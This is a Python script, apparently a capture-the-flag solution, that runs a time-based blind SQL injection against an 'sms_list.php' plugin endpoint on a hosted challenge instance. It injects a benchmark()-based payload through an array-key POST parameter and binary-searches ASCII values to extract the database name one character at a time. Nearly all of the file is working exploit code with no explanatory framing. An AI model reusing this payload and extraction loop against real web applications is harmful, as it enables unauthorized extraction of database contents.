import requests
import time
import string

baseURL = "http://eci-2ze5xfvuz0x49aclv8sx.cloudeci1.ichunqiu.com/"

def inject(s, index):
    paramsGet = {"act":"del"}
    k = "id[%3d(if(ascii(substr(database(),{},1))>{},benchmark(20000000,sha(1)),0))%23]".format(index, s)
    paramsPostDict = {
        k:"1"
    }
    paramsPost = "&".join("%s=%s" % (k,v) for k,v in paramsPostDict.items())
    '''
    headers = {
        "Origin": baseURL,
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Cache-Control":"max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36",
        "Referer":"{}/admin539/login.php".format(baseURL),
        "Connection":"close",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    '''
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    start_time = int(time.time())
    response = requests.post("{}/plugins/sms/sms_list.php".format(baseURL), data=paramsPost, params=paramsGet, headers=headers)
    end_time = int(time.time())
    if (end_time - start_time > 1) or response.status_code == 504:
        return True
    return False

def binary_search(num):
    low=0
    high=126
    while low<=high:
        print("search zone:(%d-%d)"%(low,high))
        mid = (low+high) // 2
        status = inject(mid, num)
        # status2 = inject(mid, num)
        # if num > mid:
        #     status = True
        if status:
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(1)
    return (low+high+1) // 2

# database: zzctf
res = ''
start = len(res)+1
end = start + 10
for i in range(start, end):
    r = binary_search(i)
    res += chr(r)
    print(res)
